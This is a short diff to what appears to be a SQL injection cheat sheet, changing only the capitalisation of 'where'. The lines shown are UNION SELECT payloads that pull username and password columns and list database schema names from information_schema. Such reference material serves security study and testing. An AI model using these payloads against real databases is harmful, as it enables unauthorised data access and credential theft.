@@ -134,7 +134,7 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schem
 SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
 
 ## Condition Union Select (v2):
-SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
 ````
 
 
